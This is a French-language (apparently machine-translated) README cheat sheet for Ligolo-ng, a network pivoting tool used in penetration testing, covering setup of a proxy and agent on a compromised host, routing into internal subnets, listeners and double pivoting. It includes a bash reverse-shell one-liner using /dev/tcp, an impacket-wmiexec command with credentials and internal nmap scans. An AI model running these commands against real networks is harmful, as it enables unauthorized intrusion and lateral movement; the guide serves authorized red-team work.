<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔀 Ligolo-ng - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
  ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
  ██║     ██║██║  ███╗██║   ██║██║     ██║   ██║     ██╔██╗ ██║██║  ███╗
  ██║     ██║██║   ██║██║   ██║██║     ██║   ██║     ██║╚██╗██║██║   ██║
  ███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                 Advanced TUN-based Pivoting Tool
```
<p align="center">
  <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="Interface TUN">
  <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Pivotement du réseau">
</p>

<p align="center">
  <b>🌐 Outil de pivotement moderne, simple et performant utilisant des interfaces TUN au lieu de proxys SOCKS</b>
</p>

---

## 📋 Table des matières

- [Introduction](#-introduction)
- [Pourquoi Ligolo-ng ? (Ligolo-ng vs SOCKS/Proxychains)](#-pourquoi-ligolo-ng)
- [Architecture et comment ça marche](#-architecture--comment-ça-fonctionne)
- [Installation](#-installation)
- [Guide de démarrage rapide](#-quick-start-guide)
  - [Étape 1 : Configurer l'interface TUN sur l'attaquant](#step-1-setup-tun-interface-on-attaquant)
  - [Étape 2 : Démarrez le proxy Ligolo-ng](#step-2-start-the-ligolo-ng-proxy)
  - [Étape 3 : Déployer l'agent sur la cible pivot](#step-3-deploy-the-agent-on-pivot-target)
  - [Étape 4 : Configurer le routage sur l'attaquant](#step-4-configure-routing-on-attaquant)
  - [Étape 5 : Démarrer la session tunnel](#step-5-start-the-tunnel-session)
- [Redirection de port inversée (auditeurs)] (#-reverse-port-forwarding-listeners)
-[Double pivotement (pivotement à plusieurs niveaux)](#-double-pivoting-multi-tier-pivoting)
- [Référence des commandes interactives du proxy](#-proxy-interactive-commands-reference)
- [Options de ligne de commande de l'agent](#-agent-command-line-options)
- [Dépannage et meilleures pratiques](#-dépannage--meilleures pratiques)
- [Mentions légales](#-legal-disclaimer)
- [Ressources](#-ressources)

---

## 🎯Présentation

**Ligolo-ng** est un outil de tunneling et de pivotement avancé, léger et rapide écrit en Go. Contrairement aux proxys SOCKS traditionnels (tels que le transfert dynamique Chisel ou SSH standard), Ligolo-ng établit une **interface TUN** virtuelle directement sur la machine de votre attaquant.

Cela transforme votre hôte pivot compromis en une véritable passerelle de type VPN : tous les outils de la machine de votre attaquant (y compris `nmap -sS`, `crackmapexec`, `evil-winrm`, `impacket` et les navigateurs) peuvent accéder aux sous-réseaux internes directement par adresse IP sans préfixer les commandes avec `proxychains`.

---

## ⚖️Pourquoi Ligolo-ng ?

| Fonctionnalité | Ligolo-ng | Proxychains + CHAUSSETTES | CHAUSSETTES SSH (`-D`) |
|---------|-----------|---------------|------------------|
| **Prise en charge du protocole** | TCP et UDP complets | TCP uniquement (mauvais UDP) | TCP uniquement |
| **Nmap SYN Scan (`-sS`)**| ✅ Oui (natif) | ❌ Non (nécessite TCP `-sT`) | ❌ Non |
| **Compatibilité des outils** | 100 % (pile IP du noyau) | Incohérent (LD_PRELOAD) | Incohérent |
| **Vitesse et latence** | ⭐⭐⭐⭐⭐ Très rapide | ⭐⭐⭐ Modéré | ⭐⭐⭐ Modéré |
| **Pas d'emballage de chaussettes** | ✅ Oui | ❌ Nécessite un wrapper | ❌ Nécessite un wrapper |
| **Écouteurs inversés** | ✅ Intégré | ❌ Nécessite un outil séparé | ❌ Limité |

---

## 🏗️ Architecture et fonctionnement
```
+-------------------+                          +---------------------+                          +----------------------+
|  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
| (192.168.1.100)   |                          | (Dual-homed)        |                          | (172.16.1.50)        |
|                   |                          |                     |                          |                      |
| [proxy server]    | <=== TLS Tunnel =======> | [ligolo agent]      |                          |                      |
|    ^              |      (Port 11601)        |    |                |                          |                      |
|    |              |                          |    |                |                          |                      |
| [tun0 interface]  |                          |    +--------------->| == Internal Traffic ===> | [Target Service]     |
| (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
+-------------------+                          +---------------------+                          +----------------------+
```
1. **Proxy :** s'exécute sur la machine de votre attaquant, gère les sessions et relie les paquets entre votre interface TUN virtuelle et les agents connectés.
2. **Agent :** Un binaire léger exécuté sur la machine interne compromise (Linux, Windows, macOS ou ARM).
3. **Interface TUN :** Une interface réseau de bouclage logiciel créée sous Linux qui achemine le trafic destiné aux sous-réseaux internes directement vers Ligolo.

---

## 📥Installation

Téléchargez les derniers fichiers binaires pour **proxy** et **agent** à partir de la page officielle des versions de GitHub :
```bash
# Download latest proxy for Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-proxy/

# Download agents for various targets
# Linux Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/linux/

# Windows Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
```
---

## 🚀 Guide de démarrage rapide

### Étape 1 : Configurer l'interface TUN sur l'attaquant

Avant d'exécuter le proxy, créez un périphérique TUN persistant sur votre machine attaquante Linux :
```bash
# Create a TUN interface named "ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up

# Verify interface state
ip link show ligolo
```
### Étape 2 : Démarrez le proxy Ligolo-ng

Exécutez le proxy à l'aide de certificats TLS auto-signés :
```bash
cd /opt/ligolo-proxy/
./proxy -self-cert -laddr 0.0.0.0:11601
```
> **Conseil :** Vous pouvez également fournir des certificats Let's Encrypt valides en utilisant `-certfile` et `-keyfile` pour la discrétion dans les engagements Red Team.

### Étape 3 : Déployer l'agent sur la cible pivot

Transférez l'agent sur votre hôte compromis et exécutez-le :

#### Sur la cible Linux :
```bash
chmod +x agent
./agent -connect 192.168.1.100:11601 -ignore-cert
```
#### Sur la cible Windows :
```powershell
.\agent.exe -connect 192.168.1.100:11601 -ignore-cert
```
### Étape 4 : Configurer le routage sur l'attaquant

Une fois l'agent connecté, inspectez ses interfaces réseau à partir de la console proxy pour déterminer les sous-réseaux internes de la cible (par exemple, `172.16.1.0/24`).

Sur votre **terminal attaquant** (fenêtre séparée), ajoutez une route pointant vers l'interface TUN :
```bash
# Route internal subnet through ligolo TUN device
sudo ip route add 172.16.1.0/24 dev ligolo

# Check route table
ip route show | grep ligolo
```
### Étape 5 : Démarrez la session tunnel

Dans l'invite interactive du proxy Ligolo-ng :
```text
ligolo-ng » session
? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
[Agent : user@PIVOT-HOST] » start
[Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
```
Vous disposez désormais d’un accès IP direct et natif au réseau interne ! Testez-le :
```bash
# Ping internal host
ping -c 3 172.16.1.50

# Native Nmap SYN scan without proxychains!
nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50

# Run Impacket directly
impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
```
---

## 🔄 Redirection de port inversée (auditeurs)

Vous souhaitez recevoir un shell inversé ou intercepter un relais d'authentification NTLM sur votre boîtier attaquant à partir d'un hôte interne qui ne peut pas renvoyer vers l'adresse IP de votre attaquant ? Utilisez **auditeurs** !

Lorsque vous configurez un écouteur dans Ligolo-ng, l'agent ouvre un port d'écoute sur la **machine pivot** et relaie le trafic entrant vers la machine de votre attaquant.

### Exemple : attraper un shell inversé

Dans la session proxy :
```text
[Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0035] Listener created on 0.0.0.0:4444
```
Sur votre **machine attaquante** :
```bash
nc -lvnp 4444
```
Sur une **cible interne** (`172.16.1.75`) :
```bash
# Send reverse shell to the pivot host's internal IP
bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
```
L'hôte pivot transmet la connexion directement à votre écouteur Netcat !

---

## ⛓️ Double pivotement (pivotement à plusieurs niveaux)

Lors de l'accès à des réseaux profondément imbriqués (Sous-réseau A -> Sous-réseau B -> Sous-réseau C) :

1. Établissez votre tunnel initial vers le pivot 1 (`172.16.1.10`).
2. Découvrez le Pivot 2 situé dans le sous-réseau B (`10.0.0.25`).
3. Configurez un écouteur sur le pivot 1 pour transférer le trafic du sous-réseau B vers votre port proxy `11601` :
   ```text
   [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
4. Déployez l'agent Ligolo sur Pivot 2 et connectez-vous à l'IP de Pivot 1 :
   ```bash
   ./agent -connect 172.16.1.10:11601 -ignore-cert
   ```
5. Une deuxième session apparaîtra dans votre proxy ! Ajoutez une route pour le sous-réseau C :
   ```bash
   sudo ip route add 10.0.0.0/24 dev ligolo
   ```
6. Passez à la session 2 et tapez `start`.

---

## ⌨️ Référence des commandes interactives du proxy

| Commande | Descriptif | Exemple |
|---------|-------------|---------|
| `session` | Répertorier et sélectionner les sessions d'agent connectés actives | `session` |
| `start` | Démarrer le tunneling des paquets via l'agent actif | `start` |
| `stop` | Arrêter la session tunnel active | `stop` |
| `ifconfig` | Afficher les interfaces réseau de l'agent sélectionné | `ifconfig` |
| `listener_add` | Créer un port d'écoute sur l'agent pivot | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443` |
| `listener_list`| Répertorier tous les auditeurs actifs sur l'agent actuel | `listener_list` |
| `listener_close`| Fermer un auditeur actif spécifique | `listener_close --id 0` |
| `help` | Afficher l'aide de la commande | `help` |
| `exit` | Terminer le proxy ou revenir au menu principal | `exit` |

---

## ⚙️ Options de ligne de commande de l'agent

| Drapeau | Descriptif | Exemple |
|------|-------------|--------------|
| `-connect` | Adresse et port du proxy Ligolo | `-connect 192.168.1.100:11601` |
| `-ignore-cert` | Ignorer la vérification du certificat TLS | `-ignore-cert` |
| `-retry` | Réessayer automatiquement la connexion en cas de déconnexion | `-retry` |
| `-auto-clear` | Effacer la sortie du terminal lors de l'exécution | `-auto-clear` |

---

## 💡 Dépannage et meilleures pratiques

1. **Supprimer l'interface TUN après l'engagement :**
   Une fois votre test terminé, nettoyez votre table de routage et supprimez l'interface virtuelle :
   ```bash
   sudo ip link set ligolo down
   sudo ip tuntap del mode tun ligolo
   ```
2. **Vérifiez les chevauchements de sous-réseaux IP :**
   Assurez-vous que le sous-réseau interne que vous acheminez (par exemple `192.168.1.0/24`) n'entre pas en collision avec votre réseau d'attaquant local. S'il se chevauche, utilisez une route hôte `/32` plus spécifique (par exemple, `sudo ip route add 192.168.1.50/32 dev ligolo`).
3. **Considérations sur le pare-feu sur Pivot :**
   Sur les cibles Windows, assurez-vous que le pare-feu Windows Defender autorise les connexions sortantes sur le port 11601 ou le port d'écoute de votre choix.
4. **Utilisez `-retry` dans des environnements réels :**
   Exécutez toujours des agents avec `-retry` pour rétablir automatiquement les connexions après des interruptions temporaires du réseau.

---

## ⚠️ Mentions légales

> **IMPORTANT :** Ligolo-ng est un puissant utilitaire de routage réseau. Il ne doit être utilisé que lors de tests d'intrusion autorisés, d'engagements de l'équipe rouge et d'évaluations de sécurité éthique avec un consentement écrit explicite.

---

## 📚 Ressources

- [Dépôt officiel Ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng)
- [Documentation officielle Ligolo-ng](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)